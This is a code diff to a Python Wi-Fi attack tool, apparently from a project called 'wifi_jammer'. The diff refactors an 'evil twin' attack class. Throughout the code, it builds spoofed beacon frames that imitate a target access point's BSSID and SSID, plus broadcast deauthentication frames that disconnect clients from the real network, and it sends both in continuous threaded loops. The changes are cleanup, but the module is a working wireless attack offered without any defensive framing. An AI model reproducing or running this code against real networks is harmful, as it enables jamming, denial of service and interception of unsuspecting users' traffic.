@@ -4,80 +4,96 @@ Evil twin attack implementation.
 
 import threading
 import time
-from typing import Optional
-from scapy.all import *
-from scapy.layers.dot11 import (
-    Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt
-)
+from typing import Optional, TYPE_CHECKING
+
+if TYPE_CHECKING:
+    from scapy.packet import Packet
+from scapy.sendrecv import sendp
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap
 from wifi_jammer.attacks.base_attack import BaseAttack
 from wifi_jammer.core.interfaces import AttackConfig
 from wifi_jammer.utils.validators import is_valid_bssid
+from wifi_jammer.utils.logger import RichLogger
 
 
 class EvilTwinAttack(BaseAttack):
     """Evil twin attack: rogue AP + deauth clients from real AP."""
 
-    def __init__(self, logger=None):
+    def __init__(self, logger: Optional[RichLogger] = None) -> None:
         super().__init__(logger)
-        self._deauth_thread = None
-        self._beacon_thread = None
-        self._spoof_ssid = ""
+        self._deauth_thread: Optional[threading.Thread] = None
+        self._beacon_thread: Optional[threading.Thread] = None
+        self._spoof_ssid: str = ""
 
-    def _create_packet(self) -> Optional[Packet]:
+    def _create_packet(self) -> Optional["Packet"]:
         return None
 
-    def _create_beacon_packet(self) -> Packet:
+    def _create_beacon_packet(self) -> "Packet":
+        if not self._config:
+            raise RuntimeError("Config not set")
         ssid = self._spoof_ssid or self._config.target_ssid
         channel = self._config.channel or 6
         packet = (
-            RadioTap() /
-            Dot11(
+            RadioTap()
+            / Dot11(
                 addr1="ff:ff:ff:ff:ff:ff",
                 addr2=self._config.target_bssid,
-                addr3=self._config.target_bssid
-            ) /
-            Dot11Beacon(cap="ESS") /
-            Dot11Elt(ID="SSID", info=ssid) /
-            Dot11Elt(ID="Rates", info=b"\x82\x84\x0b\x16") /
-            Dot11Elt(ID="DSset", info=bytes([channel]))
+                addr3=self._config.target_bssid,
+            )
+            / Dot11Beacon(cap="ESS")
+            / Dot11Elt(ID="SSID", info=ssid)
+            / Dot11Elt(ID="Rates", info=b"\x82\x84\x0b\x16")
+            / Dot11Elt(ID="DSset", info=bytes([channel]))
         )
         return packet
 
-    def _create_deauth_packet(self) -> Packet:
+    def _create_deauth_packet(self) -> "Packet":
+        if not self._config:
+            raise RuntimeError("Config not set")
         destination = "ff:ff:ff:ff:ff:ff"
         packet = (
-            RadioTap() /
-            Dot11(
+            RadioTap()
+            / Dot11(
                 addr1=destination,
                 addr2=self._config.target_bssid,
-                addr3=self._config.target_bssid
-            ) /
-            Dot11Deauth(reason=7)
+                addr3=self._config.target_bssid,
+            )
+            / Dot11Deauth(reason=7)
         )
         return packet
 
-    def _beacon_loop(self):
+    def _beacon_loop(self) -> None:
         while self._running:
             try:
                 packet = self._create_beacon_packet()
-                sendp(packet, iface=self._config.interface, verbose=False)
+                sendp(
+                    packet,
+                    iface=self._config.interface if self._config else "",
+                    verbose=False,
+                )
                 self._stats.packets_sent += 1
                 self._stats.last_packet_time = time.time()
             except Exception as e:
                 self._stats.packets_failed += 1
-                self._stats.errors.append(f"Beacon error: {e}")
+                if self._stats.errors is not None:
+                    self._stats.errors.append(f"Beacon error: {e}")
             time.sleep(0.1)
 
-    def _deauth_loop(self):
+    def _deauth_loop(self) -> None:
         while self._running:
             try:
                 packet = self._create_deauth_packet()
-                sendp(packet, iface=self._config.interface, verbose=False)
+                sendp(
+                    packet,
+                    iface=self._config.interface if self._config else "",
+                    verbose=False,
+                )
                 self._stats.packets_sent += 1
                 self._stats.last_packet_time = time.time()
             except Exception as e:
                 self._stats.packets_failed += 1
-                self._stats.errors.append(f"Deauth error: {e}")
+                if self._stats.errors is not None:
+                    self._stats.errors.append(f"Deauth error: {e}")
             time.sleep(0.05)
 
     def execute(self, config: AttackConfig) -> bool:
@@ -108,7 +124,7 @@ class EvilTwinAttack(BaseAttack):
         self.logger.info(f"Channel: {config.channel}")
         return True
 
-    def stop(self):
+    def stop(self) -> None:
         if not self._running:
             return
         self._running = False
